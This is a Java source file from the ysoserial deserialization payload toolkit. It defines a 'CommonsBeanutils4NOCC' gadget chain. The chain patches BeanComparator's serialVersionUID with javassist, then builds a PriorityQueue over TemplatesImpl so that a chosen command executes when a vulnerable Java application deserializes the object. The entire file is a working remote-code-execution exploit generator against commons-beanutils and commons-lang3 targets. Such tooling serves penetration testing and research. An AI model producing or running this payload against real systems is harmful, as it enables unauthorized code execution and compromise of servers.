package ysoserial.payloads;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;

import org.apache.commons.lang3.compare.ObjectToStringComparator;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.SuClassLoader;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;

import java.util.Comparator;
import java.util.PriorityQueue;

import static ysoserial.payloads.util.Reflections.setFieldValue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.8.3", "commons-lang3:commons-lang3:3.12.1"})
@Authors({Authors.Su8})
public class CommonsBeanutils4NOCC implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);
        // 修改BeanComparator类的serialVersionUID
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
        ctBeanComparator.defrost();
        try {
            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
            ctBeanComparator.removeField(ctSUID);
        } catch (javassist.NotFoundException e) {
        }
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));

        final Comparator comparator = (Comparator) ctBeanComparator.toClass(new SuClassLoader()).newInstance();
        setFieldValue(comparator, "property", null);
        setFieldValue(comparator, "comparator", ObjectToStringComparator.INSTANCE);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});
        ctBeanComparator.defrost();
        return queue;
    }
}
